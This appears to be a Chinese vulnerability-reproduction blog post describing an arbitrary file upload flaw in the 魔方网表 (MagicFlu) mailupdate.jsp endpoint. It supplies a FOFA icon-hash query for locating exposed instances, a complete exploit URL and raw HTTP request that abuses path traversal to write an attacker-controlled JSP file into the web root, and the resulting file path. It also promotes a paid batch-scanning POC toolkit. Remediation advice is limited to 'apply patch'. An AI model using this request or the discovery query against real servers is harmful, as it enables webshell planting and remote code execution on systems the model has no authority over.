#  魔方网表mailupdate.jsp接口存在任意文件上传漏洞   
南风漏洞复现文库  南风漏洞复现文库   2024-04-15 23:13  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 魔方网表mailupdate.jsp接口简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
魔方网表  
## 2.漏洞描述  
  
魔方网表帮助其搭建了支持信创环境的端到端的一站式数据智能填报系统,实现数据收集模板个性化定义,收集任务集中管控,结构化数据存储、分析及呈现等功能。魔方网表mailupdate.jsp接口存在任意文件上传漏洞  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
魔方网表  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YYicf2evTexG9Cur1T5FFUB4UTJ5enSQ8zQQjFSicEXIcBIl7fgviaq8xZWJUiaNk8V3rvRTZFlFKOAg/640?wx_fmt=jpeg&from=appmsg "null")  
  
魔方网表mailupdate.jsp接口存在任意文件上传漏洞  
## 4.fofa查询语句  
  
icon_hash="694014318"  
## 5.漏洞复现  
  
漏洞链接：http://127.0.0.1/magicflu/html/mail/mailupdate.jsp?messageid=/../../../test1.jsp&messagecontent=%3C%25+out.println%28%22tteesstt1%22%29%3B%25%3E  
  
漏洞数据包：  
```
GET /magicflu/html/mail/mailupdate.jsp?messageid=/../../../test1.jsp&messagecontent=%3C%25+out.println%28%22tteesstt1%22%29%3B%25%3E HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: 127.0.0.1
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YYicf2evTexG9Cur1T5FFUBVW9USDeNQqANmsc1slJmvH9t0NoOicnWFmaRlBvNOqZSibD5zdicKDgbA/640?wx_fmt=jpeg&from=appmsg "null")  
  
上传后的路径： http://127.0.0.1/magicflu/test1.jsp  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YYicf2evTexG9Cur1T5FFUB1POS7SND4BBlibRrxic3AibdW2wEic5DIPvtOFmlyl4e2iaFGZKRQoGP73g/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。2: 免登录，免费fofa查询。3: 更新其他实用网络安全工具项目。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YYicf2evTexG9Cur1T5FFUB7pjTVibnllcDoExgUR63VpRjq1VYbnlkrYVzQh9SUB7jicOs79kwFskg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YYicf2evTexG9Cur1T5FFUBRFymhYsSn6mzmVwCYN1ZBticHpxO6Ivvx1QVb9JqkoEb5Q6872VBjnw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YYicf2evTexG9Cur1T5FFUBRibL7D1MKhROMjwKa4HxcPuns4DS5AictCaJ1I5acVnhXK5uPghtBUzQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YYicf2evTexG9Cur1T5FFUByCVf9VmDm66CI1CKwk6ZnmYYsP8S5z160Mrlq4gibrGqiaFHibRBicPOlg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YYicf2evTexG9Cur1T5FFUB3Mp5PficG2icGoAicF4tqbyVWS8HIqjWUho0iaCLfjf1PLk1yUfAgwTHyg/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
打补丁  
## 8.往期回顾  
  
[浙大恩特客户资源管理系统Ri0004_openFileByStream.jsp接口存在任意文件读取漏洞](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247486163&idx=1&sn=be62990ea16076d51fba74099ada6664&chksm=974b87d4a03c0ec25569a4fe6371b5762a9974bd3ffc75871c8a8641d676354a0b4f3b1d8d83&scene=21#wechat_redirect)  
  
  
[泛微e-cology ProcessOverRequestByXml接口存在任意文件读取漏洞](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247486150&idx=1&sn=9b0138cc0cb06187b6dc752daa33774a&chksm=974b87c1a03c0ed75d1bc10246fb12f5f72a8901dec2ec3579988da10c5dcf4fe61edad0f46e&scene=21#wechat_redirect)  
  
  
  
  
